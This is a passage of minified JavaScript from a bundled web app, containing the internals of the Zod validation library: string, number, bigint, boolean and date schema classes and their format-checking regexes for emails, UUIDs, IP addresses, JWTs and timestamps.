                    s?.message?.toLowerCase()?.includes("encountered") && (this["~standard"].async = !0),
                    n.common = {
                        issues: [],
                        async: !0
                    }
                }
            return this._parseAsync({
                data: e,
                path: [],
                parent: n
            }).then(s => Rs(s) ? {
                value: s.value
            } : {
                issues: n.common.issues
            })
        }
        async parseAsync(e, n) {
            const s = await this.safeParseAsync(e, n);
            if (s.success)
                return s.data;
            throw s.error
        }
        async safeParseAsync(e, n) {
            const s = {
                common: {
                    issues: [],
                    contextualErrorMap: n?.errorMap,
                    async: !0
                },
                path: n?.path || [],
                schemaErrorMap: this._def.errorMap,
                parent: null,
                data: e,
                parsedType: Zi(e)
            }
              , o = this._parse({
                data: e,
                path: s.path,
                parent: s
            })
              , l = await (Cl(o) ? o : Promise.resolve(o));
            return dA(s, l)
        }
        refine(e, n) {
            const s = o => typeof n == "string" || typeof n > "u" ? {
                message: n
            } : typeof n == "function" ? n(o) : n;
            return this._refinement( (o, l) => {
                const u = e(o)
                  , d = () => l.addIssue({
                    code: te.custom,
                    ...s(o)
                });
                return typeof Promise < "u" && u instanceof Promise ? u.then(p => p ? !0 : (d(),
                !1)) : u ? !0 : (d(),
                !1)
            }
            )
        }
        refinement(e, n) {
            return this._refinement( (s, o) => e(s) ? !0 : (o.addIssue(typeof n == "function" ? n(s, o) : n),
            !1))
        }
        _refinement(e) {
            return new ni({
                schema: this,
                typeName: Se.ZodEffects,
                effect: {
                    type: "refinement",
                    refinement: e
                }
            })
        }
        superRefine(e) {
            return this._refinement(e)
        }
        constructor(e) {
            this.spa = this.safeParseAsync,
            this._def = e,
            this.parse = this.parse.bind(this),
            this.safeParse = this.safeParse.bind(this),
            this.parseAsync = this.parseAsync.bind(this),
            this.safeParseAsync = this.safeParseAsync.bind(this),
            this.spa = this.spa.bind(this),
            this.refine = this.refine.bind(this),
            this.refinement = this.refinement.bind(this),
            this.superRefine = this.superRefine.bind(this),
            this.optional = this.optional.bind(this),
            this.nullable = this.nullable.bind(this),
            this.nullish = this.nullish.bind(this),
            this.array = this.array.bind(this),
            this.promise = this.promise.bind(this),
            this.or = this.or.bind(this),
            this.and = this.and.bind(this),
            this.transform = this.transform.bind(this),
            this.brand = this.brand.bind(this),
            this.default = this.default.bind(this),
            this.catch = this.catch.bind(this),
            this.describe = this.describe.bind(this),
            this.pipe = this.pipe.bind(this),
            this.readonly = this.readonly.bind(this),
            this.isNullable = this.isNullable.bind(this),
            this.isOptional = this.isOptional.bind(this),
            this["~standard"] = {
                version: 1,
                vendor: "zod",
                validate: n => this["~validate"](n)
            }
        }
        optional() {
            return yi.create(this, this._def)
        }
        nullable() {
            return Gr.create(this, this._def)
        }
        nullish() {
            return this.nullable().optional()
        }
        array() {
            return ti.create(this)
        }
        promise() {
            return Va.create(this, this._def)
        }
        or(e) {
            return Nl.create([this, e], this._def)
        }
        and(e) {
            return Ml.create(this, e, this._def)
        }
        transform(e) {
            return new ni({
                ...Oe(this._def),
                schema: this,
                typeName: Se.ZodEffects,
                effect: {
                    type: "transform",
                    transform: e
                }
            })
        }
        default(e) {
            const n = typeof e == "function" ? e : () => e;
            return new Pl({
                ...Oe(this._def),
                innerType: this,
                defaultValue: n,
                typeName: Se.ZodDefault
            })
        }
        brand() {
            return new Kp({
                typeName: Se.ZodBranded,
                type: this,
                ...Oe(this._def)
            })
        }
        catch(e) {
            const n = typeof e == "function" ? e : () => e;
            return new Hl({
                ...Oe(this._def),
                innerType: this,
                catchValue: n,
                typeName: Se.ZodCatch
            })
        }
        describe(e) {
            const n = this.constructor;
            return new n({
                ...this._def,
                description: e
            })
        }
        pipe(e) {
            return rc.create(this, e)
        }
        readonly() {
            return zl.create(this)
        }
        isOptional() {
            return this.safeParse(void 0).success
        }
        isNullable() {
            return this.safeParse(null).success
        }
    }
    const fB = /^c[^\s-]{8,}$/i
      , hB = /^[0-9a-z]+$/
      , mB = /^[0-9A-HJKMNP-TV-Z]{26}$/i
      , pB = /^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i
      , gB = /^[a-z0-9_-]{21}$/i
      , yB = /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$/
      , vB = /^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/
      , bB = /^(?!\.)(?!.*\.\.)([A-Z0-9_'+\-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i
      , AB = "^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$";
    let Cm;
    const wB = /^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/
      , _B = /^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/(3[0-2]|[12]?[0-9])$/
      , EB = /^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/
      , xB = /^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/
      , SB = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/
      , TB = /^([0-9a-zA-Z-_]{4})*(([0-9a-zA-Z-_]{2}(==)?)|([0-9a-zA-Z-_]{3}(=)?))?$/
      , L1 = "((\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-((0[13578]|1[02])-(0[1-9]|[12]\\d|3[01])|(0[469]|11)-(0[1-9]|[12]\\d|30)|(02)-(0[1-9]|1\\d|2[0-8])))"
      , RB = new RegExp(`^${L1}$`);
    function U1(t) {
        let e = "[0-5]\\d";
        t.precision ? e = `${e}\\.\\d{${t.precision}}` : t.precision == null && (e = `${e}(\\.\\d+)?`);
        const n = t.precision ? "+" : "?";
        return `([01]\\d|2[0-3]):[0-5]\\d(:${e})${n}`
    }
    function BB(t) {
        return new RegExp(`^${U1(t)}$`)
    }
    function j1(t) {
        let e = `${L1}T${U1(t)}`;
        const n = [];
        return n.push(t.local ? "Z?" : "Z"),
        t.offset && n.push("([+-]\\d{2}:?\\d{2})"),
        e = `${e}(${n.join("|")})`,
        new RegExp(`^${e}$`)
    }
    function CB(t, e) {
        return !!((e === "v4" || !e) && wB.test(t) || (e === "v6" || !e) && EB.test(t))
    }
    function IB(t, e) {
        if (!yB.test(t))
            return !1;
        try {
            const [n] = t.split(".");
            if (!n)
                return !1;
            const s = n.replace(/-/g, "+").replace(/_/g, "/").padEnd(n.length + (4 - n.length % 4) % 4, "=")
              , o = JSON.parse(atob(s));
            return !(typeof o != "object" || o === null || "typ"in o && o?.typ !== "JWT" || !o.alg || e && o.alg !== e)
        } catch {
            return !1
        }
    }
    function kB(t, e) {
        return !!((e === "v4" || !e) && _B.test(t) || (e === "v6" || !e) && xB.test(t))
    }
    class ei extends Me {
        _parse(e) {
            if (this._def.coerce && (e.data = String(e.data)),
            this._getType(e) !== fe.string) {
                const l = this._getOrReturnCtx(e);
                return ce(l, {
                    code: te.invalid_type,
                    expected: fe.string,
                    received: l.parsedType
                }),
                xe
            }
            const s = new Zt;
            let o;
            for (const l of this._def.checks)
                if (l.kind === "min")
                    e.data.length < l.value && (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        code: te.too_small,
                        minimum: l.value,
                        type: "string",
                        inclusive: !0,
                        exact: !1,
                        message: l.message
                    }),
                    s.dirty());
                else if (l.kind === "max")
                    e.data.length > l.value && (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        code: te.too_big,
                        maximum: l.value,
                        type: "string",
                        inclusive: !0,
                        exact: !1,
                        message: l.message
                    }),
                    s.dirty());
                else if (l.kind === "length") {
                    const u = e.data.length > l.value
                      , d = e.data.length < l.value;
                    (u || d) && (o = this._getOrReturnCtx(e, o),
                    u ? ce(o, {
                        code: te.too_big,
                        maximum: l.value,
                        type: "string",
                        inclusive: !0,
                        exact: !0,
                        message: l.message
                    }) : d && ce(o, {
                        code: te.too_small,
                        minimum: l.value,
                        type: "string",
                        inclusive: !0,
                        exact: !0,
                        message: l.message
                    }),
                    s.dirty())
                } else if (l.kind === "email")
                    bB.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "email",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty());
                else if (l.kind === "emoji")
                    Cm || (Cm = new RegExp(AB,"u")),
                    Cm.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "emoji",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty());
                else if (l.kind === "uuid")
                    pB.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "uuid",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty());
                else if (l.kind === "nanoid")
                    gB.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "nanoid",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty());
                else if (l.kind === "cuid")
                    fB.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "cuid",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty());
                else if (l.kind === "cuid2")
                    hB.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "cuid2",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty());
                else if (l.kind === "ulid")
                    mB.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "ulid",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty());
                else if (l.kind === "url")
                    try {
                        new URL(e.data)
                    } catch {
                        o = this._getOrReturnCtx(e, o),
                        ce(o, {
                            validation: "url",
                            code: te.invalid_string,
                            message: l.message
                        }),
                        s.dirty()
                    }
                else
                    l.kind === "regex" ? (l.regex.lastIndex = 0,
                    l.regex.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "regex",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty())) : l.kind === "trim" ? e.data = e.data.trim() : l.kind === "includes" ? e.data.includes(l.value, l.position) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        code: te.invalid_string,
                        validation: {
                            includes: l.value,
                            position: l.position
                        },
                        message: l.message
                    }),
                    s.dirty()) : l.kind === "toLowerCase" ? e.data = e.data.toLowerCase() : l.kind === "toUpperCase" ? e.data = e.data.toUpperCase() : l.kind === "startsWith" ? e.data.startsWith(l.value) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        code: te.invalid_string,
                        validation: {
                            startsWith: l.value
                        },
                        message: l.message
                    }),
                    s.dirty()) : l.kind === "endsWith" ? e.data.endsWith(l.value) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        code: te.invalid_string,
                        validation: {
                            endsWith: l.value
                        },
                        message: l.message
                    }),
                    s.dirty()) : l.kind === "datetime" ? j1(l).test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        code: te.invalid_string,
                        validation: "datetime",
                        message: l.message
                    }),
                    s.dirty()) : l.kind === "date" ? RB.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        code: te.invalid_string,
                        validation: "date",
                        message: l.message
                    }),
                    s.dirty()) : l.kind === "time" ? BB(l).test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        code: te.invalid_string,
                        validation: "time",
                        message: l.message
                    }),
                    s.dirty()) : l.kind === "duration" ? vB.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "duration",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty()) : l.kind === "ip" ? CB(e.data, l.version) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "ip",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty()) : l.kind === "jwt" ? IB(e.data, l.alg) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "jwt",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty()) : l.kind === "cidr" ? kB(e.data, l.version) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "cidr",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty()) : l.kind === "base64" ? SB.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "base64",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty()) : l.kind === "base64url" ? TB.test(e.data) || (o = this._getOrReturnCtx(e, o),
                    ce(o, {
                        validation: "base64url",
                        code: te.invalid_string,
                        message: l.message
                    }),
                    s.dirty()) : Qe.assertNever(l);
            return {
                status: s.value,
                value: e.data
            }
        }
        _regex(e, n, s) {
            return this.refinement(o => e.test(o), {
                validation: n,
                code: te.invalid_string,
                ...pe.errToObj(s)
            })
        }
        _addCheck(e) {
            return new ei({
                ...this._def,
                checks: [...this._def.checks, e]
            })
        }
        email(e) {
            return this._addCheck({
                kind: "email",
                ...pe.errToObj(e)
            })
        }
        url(e) {
            return this._addCheck({
                kind: "url",
                ...pe.errToObj(e)
            })
        }
        emoji(e) {
            return this._addCheck({
                kind: "emoji",
                ...pe.errToObj(e)
            })
        }
        uuid(e) {
            return this._addCheck({
                kind: "uuid",
                ...pe.errToObj(e)
            })
        }
        nanoid(e) {
            return this._addCheck({
                kind: "nanoid",
                ...pe.errToObj(e)
            })
        }
        cuid(e) {
            return this._addCheck({
                kind: "cuid",
                ...pe.errToObj(e)
            })
        }
        cuid2(e) {
            return this._addCheck({
                kind: "cuid2",
                ...pe.errToObj(e)
            })
        }
        ulid(e) {
            return this._addCheck({
                kind: "ulid",
                ...pe.errToObj(e)
            })
        }
        base64(e) {
            return this._addCheck({
                kind: "base64",
                ...pe.errToObj(e)
            })
        }
        base64url(e) {
            return this._addCheck({
                kind: "base64url",
                ...pe.errToObj(e)
            })
        }
        jwt(e) {
            return this._addCheck({
                kind: "jwt",
                ...pe.errToObj(e)
            })
        }
        ip(e) {
            return this._addCheck({
                kind: "ip",
                ...pe.errToObj(e)
            })
        }
        cidr(e) {
            return this._addCheck({
                kind: "cidr",
                ...pe.errToObj(e)
            })
        }
        datetime(e) {
            return typeof e == "string" ? this._addCheck({
                kind: "datetime",
                precision: null,
                offset: !1,
                local: !1,
                message: e
            }) : this._addCheck({
                kind: "datetime",
                precision: typeof e?.precision > "u" ? null : e?.precision,
                offset: e?.offset ?? !1,
                local: e?.local ?? !1,
                ...pe.errToObj(e?.message)
            })
        }
        date(e) {
            return this._addCheck({
                kind: "date",
                message: e
            })
        }
        time(e) {
            return typeof e == "string" ? this._addCheck({
                kind: "time",
                precision: null,
                message: e
            }) : this._addCheck({
                kind: "time",
                precision: typeof e?.precision > "u" ? null : e?.precision,
                ...pe.errToObj(e?.message)
            })
        }
        duration(e) {
            return this._addCheck({
                kind: "duration",
                ...pe.errToObj(e)
            })
        }
        regex(e, n) {
            return this._addCheck({
                kind: "regex",
                regex: e,
                ...pe.errToObj(n)
            })
        }
        includes(e, n) {
            return this._addCheck({
                kind: "includes",
                value: e,
                position: n?.position,
                ...pe.errToObj(n?.message)
            })
        }
        startsWith(e, n) {
            return this._addCheck({
                kind: "startsWith",
                value: e,
                ...pe.errToObj(n)
            })
        }
        endsWith(e, n) {
            return this._addCheck({
                kind: "endsWith",
                value: e,
                ...pe.errToObj(n)
            })
        }
        min(e, n) {
            return this._addCheck({
                kind: "min",
                value: e,
                ...pe.errToObj(n)
            })
        }
        max(e, n) {
            return this._addCheck({
                kind: "max",
                value: e,
                ...pe.errToObj(n)
            })
        }
        length(e, n) {
            return this._addCheck({
                kind: "length",
                value: e,
                ...pe.errToObj(n)
            })
        }
        nonempty(e) {
            return this.min(1, pe.errToObj(e))
        }
        trim() {
            return new ei({
                ...this._def,
                checks: [...this._def.checks, {
                    kind: "trim"
                }]
            })
        }
        toLowerCase() {
            return new ei({
                ...this._def,
                checks: [...this._def.checks, {
                    kind: "toLowerCase"
                }]
            })
        }
        toUpperCase() {
            return new ei({
                ...this._def,
                checks: [...this._def.checks, {
                    kind: "toUpperCase"
                }]
            })
        }
        get isDatetime() {
            return !!this._def.checks.find(e => e.kind === "datetime")
        }
        get isDate() {
            return !!this._def.checks.find(e => e.kind === "date")
        }
        get isTime() {
            return !!this._def.checks.find(e => e.kind === "time")
        }
        get isDuration() {
            return !!this._def.checks.find(e => e.kind === "duration")
        }
        get isEmail() {
            return !!this._def.checks.find(e => e.kind === "email")
        }
        get isURL() {
            return !!this._def.checks.find(e => e.kind === "url")
        }
        get isEmoji() {
            return !!this._def.checks.find(e => e.kind === "emoji")
        }
        get isUUID() {
            return !!this._def.checks.find(e => e.kind === "uuid")
        }
        get isNANOID() {
            return !!this._def.checks.find(e => e.kind === "nanoid")
        }
        get isCUID() {
            return !!this._def.checks.find(e => e.kind === "cuid")
        }
        get isCUID2() {
            return !!this._def.checks.find(e => e.kind === "cuid2")
        }
        get isULID() {
            return !!this._def.checks.find(e => e.kind === "ulid")
        }
        get isIP() {
            return !!this._def.checks.find(e => e.kind === "ip")
        }
        get isCIDR() {
            return !!this._def.checks.find(e => e.kind === "cidr")
        }
        get isBase64() {
            return !!this._def.checks.find(e => e.kind === "base64")
        }
        get isBase64url() {
            return !!this._def.checks.find(e => e.kind === "base64url")
        }
        get minLength() {
            let e = null;
            for (const n of this._def.checks)
                n.kind === "min" && (e === null || n.value > e) && (e = n.value);
            return e
        }
        get maxLength() {
            let e = null;
            for (const n of this._def.checks)
                n.kind === "max" && (e === null || n.value < e) && (e = n.value);
            return e
        }
    }
    ei.create = t => new ei({
        checks: [],
        typeName: Se.ZodString,
        coerce: t?.coerce ?? !1,
        ...Oe(t)
    });
    function OB(t, e) {
        const n = (t.toString().split(".")[1] || "").length
          , s = (e.toString().split(".")[1] || "").length
          , o = n > s ? n : s
          , l = Number.parseInt(t.toFixed(o).replace(".", ""))
          , u = Number.parseInt(e.toFixed(o).replace(".", ""));
        return l % u / 10 ** o
    }
    class Pr extends Me {
        constructor() {
            super(...arguments),
            this.min = this.gte,
            this.max = this.lte,
            this.step = this.multipleOf
        }
        _parse(e) {
            if (this._def.coerce && (e.data = Number(e.data)),
            this._getType(e) !== fe.number) {
                const l = this._getOrReturnCtx(e);
                return ce(l, {
                    code: te.invalid_type,
                    expected: fe.number,
                    received: l.parsedType
                }),
                xe
            }
            let s;
            const o = new Zt;
            for (const l of this._def.checks)
                l.kind === "int" ? Qe.isInteger(e.data) || (s = this._getOrReturnCtx(e, s),
                ce(s, {
                    code: te.invalid_type,
                    expected: "integer",
                    received: "float",
                    message: l.message
                }),
                o.dirty()) : l.kind === "min" ? (l.inclusive ? e.data < l.value : e.data <= l.value) && (s = this._getOrReturnCtx(e, s),
                ce(s, {
                    code: te.too_small,
                    minimum: l.value,
                    type: "number",
                    inclusive: l.inclusive,
                    exact: !1,
                    message: l.message
                }),
                o.dirty()) : l.kind === "max" ? (l.inclusive ? e.data > l.value : e.data >= l.value) && (s = this._getOrReturnCtx(e, s),
                ce(s, {
                    code: te.too_big,
                    maximum: l.value,
                    type: "number",
                    inclusive: l.inclusive,
                    exact: !1,
                    message: l.message
                }),
                o.dirty()) : l.kind === "multipleOf" ? OB(e.data, l.value) !== 0 && (s = this._getOrReturnCtx(e, s),
                ce(s, {
                    code: te.not_multiple_of,
                    multipleOf: l.value,
                    message: l.message
                }),
                o.dirty()) : l.kind === "finite" ? Number.isFinite(e.data) || (s = this._getOrReturnCtx(e, s),
                ce(s, {
                    code: te.not_finite,
                    message: l.message
                }),
                o.dirty()) : Qe.assertNever(l);
            return {
                status: o.value,
                value: e.data
            }
        }
        gte(e, n) {
            return this.setLimit("min", e, !0, pe.toString(n))
        }
        gt(e, n) {
            return this.setLimit("min", e, !1, pe.toString(n))
        }
        lte(e, n) {
            return this.setLimit("max", e, !0, pe.toString(n))
        }
        lt(e, n) {
            return this.setLimit("max", e, !1, pe.toString(n))
        }
        setLimit(e, n, s, o) {
            return new Pr({
                ...this._def,
                checks: [...this._def.checks, {
                    kind: e,
                    value: n,
                    inclusive: s,
                    message: pe.toString(o)
                }]
            })
        }
        _addCheck(e) {
            return new Pr({
                ...this._def,
                checks: [...this._def.checks, e]
            })
        }
        int(e) {
            return this._addCheck({
                kind: "int",
                message: pe.toString(e)
            })
        }
        positive(e) {
            return this._addCheck({
                kind: "min",
                value: 0,
                inclusive: !1,
                message: pe.toString(e)
            })
        }
        negative(e) {
            return this._addCheck({
                kind: "max",
                value: 0,
                inclusive: !1,
                message: pe.toString(e)
            })
        }
        nonpositive(e) {
            return this._addCheck({
                kind: "max",
                value: 0,
                inclusive: !0,
                message: pe.toString(e)
            })
        }
        nonnegative(e) {
            return this._addCheck({
                kind: "min",
                value: 0,
                inclusive: !0,
                message: pe.toString(e)
            })
        }
        multipleOf(e, n) {
            return this._addCheck({
                kind: "multipleOf",
                value: e,
                message: pe.toString(n)
            })
        }
        finite(e) {
            return this._addCheck({
                kind: "finite",
                message: pe.toString(e)
            })
        }
        safe(e) {
            return this._addCheck({
                kind: "min",
                inclusive: !0,
                value: Number.MIN_SAFE_INTEGER,
                message: pe.toString(e)
            })._addCheck({
                kind: "max",
                inclusive: !0,
                value: Number.MAX_SAFE_INTEGER,
                message: pe.toString(e)
            })
        }
        get minValue() {
            let e = null;
            for (const n of this._def.checks)
                n.kind === "min" && (e === null || n.value > e) && (e = n.value);
            return e
        }
        get maxValue() {
            let e = null;
            for (const n of this._def.checks)
                n.kind === "max" && (e === null || n.value < e) && (e = n.value);
            return e
        }
        get isInt() {
            return !!this._def.checks.find(e => e.kind === "int" || e.kind === "multipleOf" && Qe.isInteger(e.value))
        }
        get isFinite() {
            let e = null
              , n = null;
            for (const s of this._def.checks) {
                if (s.kind === "finite" || s.kind === "int" || s.kind === "multipleOf")
                    return !0;
                s.kind === "min" ? (n === null || s.value > n) && (n = s.value) : s.kind === "max" && (e === null || s.value < e) && (e = s.value)
            }
            return Number.isFinite(n) && Number.isFinite(e)
        }
    }
    Pr.create = t => new Pr({
        checks: [],
        typeName: Se.ZodNumber,
        coerce: t?.coerce || !1,
        ...Oe(t)
    });
    class Hr extends Me {
        constructor() {
            super(...arguments),
            this.min = this.gte,
            this.max = this.lte
        }
        _parse(e) {
            if (this._def.coerce)
                try {
                    e.data = BigInt(e.data)
                } catch {
                    return this._getInvalidInput(e)
                }
            if (this._getType(e) !== fe.bigint)
                return this._getInvalidInput(e);
            let s;
            const o = new Zt;
            for (const l of this._def.checks)
                l.kind === "min" ? (l.inclusive ? e.data < l.value : e.data <= l.value) && (s = this._getOrReturnCtx(e, s),
                ce(s, {
                    code: te.too_small,
                    type: "bigint",
                    minimum: l.value,
                    inclusive: l.inclusive,
                    message: l.message
                }),
                o.dirty()) : l.kind === "max" ? (l.inclusive ? e.data > l.value : e.data >= l.value) && (s = this._getOrReturnCtx(e, s),
                ce(s, {
                    code: te.too_big,
                    type: "bigint",
                    maximum: l.value,
                    inclusive: l.inclusive,
                    message: l.message
                }),
                o.dirty()) : l.kind === "multipleOf" ? e.data % l.value !== BigInt(0) && (s = this._getOrReturnCtx(e, s),
                ce(s, {
                    code: te.not_multiple_of,
                    multipleOf: l.value,
                    message: l.message
                }),
                o.dirty()) : Qe.assertNever(l);
            return {
                status: o.value,
                value: e.data
            }
        }
        _getInvalidInput(e) {
            const n = this._getOrReturnCtx(e);
            return ce(n, {
                code: te.invalid_type,
                expected: fe.bigint,
                received: n.parsedType
            }),
            xe
        }
        gte(e, n) {
            return this.setLimit("min", e, !0, pe.toString(n))
        }
        gt(e, n) {
            return this.setLimit("min", e, !1, pe.toString(n))
        }
        lte(e, n) {
            return this.setLimit("max", e, !0, pe.toString(n))
        }
        lt(e, n) {
            return this.setLimit("max", e, !1, pe.toString(n))
        }
        setLimit(e, n, s, o) {
            return new Hr({
                ...this._def,
                checks: [...this._def.checks, {
                    kind: e,
                    value: n,
                    inclusive: s,
                    message: pe.toString(o)
                }]
            })
        }
        _addCheck(e) {
            return new Hr({
                ...this._def,
                checks: [...this._def.checks, e]
            })
        }
        positive(e) {
            return this._addCheck({
                kind: "min",
                value: BigInt(0),
                inclusive: !1,
                message: pe.toString(e)
            })
        }
        negative(e) {
            return this._addCheck({
                kind: "max",
                value: BigInt(0),
                inclusive: !1,
                message: pe.toString(e)
            })
        }
        nonpositive(e) {
            return this._addCheck({
                kind: "max",
                value: BigInt(0),
                inclusive: !0,
                message: pe.toString(e)
            })
        }
        nonnegative(e) {
            return this._addCheck({
                kind: "min",
                value: BigInt(0),
                inclusive: !0,
                message: pe.toString(e)
            })
        }
        multipleOf(e, n) {
            return this._addCheck({
                kind: "multipleOf",
                value: e,
                message: pe.toString(n)
            })
        }
        get minValue() {
            let e = null;
            for (const n of this._def.checks)
                n.kind === "min" && (e === null || n.value > e) && (e = n.value);
            return e
        }
        get maxValue() {
            let e = null;
            for (const n of this._def.checks)
                n.kind === "max" && (e === null || n.value < e) && (e = n.value);
            return e
        }
    }
    Hr.create = t => new Hr({
        checks: [],
        typeName: Se.ZodBigInt,
        coerce: t?.coerce ?? !1,
        ...Oe(t)
    });
    class Il extends Me {
        _parse(e) {
            if (this._def.coerce && (e.data = !!e.data),
            this._getType(e) !== fe.boolean) {
                const s = this._getOrReturnCtx(e);
                return ce(s, {
                    code: te.invalid_type,
                    expected: fe.boolean,
                    received: s.parsedType
                }),
                xe
            }
            return tn(e.data)
        }
    }
    Il.create = t => new Il({
        typeName: Se.ZodBoolean,
        coerce: t?.coerce || !1,
        ...Oe(t)
    });
    class Bs extends Me {
        _parse(e) {
            if (this._def.coerce && (e.data = new Date(e.data)),
            this._getType(e) !== fe.date) {
                const l = this._getOrReturnCtx(e);
                return ce(l, {
                    code: te.invalid_type,
                    expected: fe.date,
                    received: l.parsedType
                }),
                xe
            }
            if (Number.isNaN(e.data.getTime())) {
                const l = this._getOrReturnCtx(e);
                return ce(l, {
                    code: te.invalid_date
                }),
                xe
            }
            const s = new Zt;
            let o;
            for (const l of this._def.checks)
                l.kind === "min" ? e.data.getTime() < l.value && (o = this._getOrReturnCtx(e, o),
                ce(o, {
                    code: te.too_small,
                    message: l.message,
                    inclusive: !0,
                    exact: !1,
                    minimum: l.value,
                    type: "date"
                }),
                s.dirty()) : l.kind === "max" ? e.data.getTime() > l.value && (o = this._getOrReturnCtx(e, o),
                ce(o, {
                    code: te.too_big,
                    message: l.message,
                    inclusive: !0,
                    exact: !1,
                    maximum: l.value,
                    type: "date"
                }),
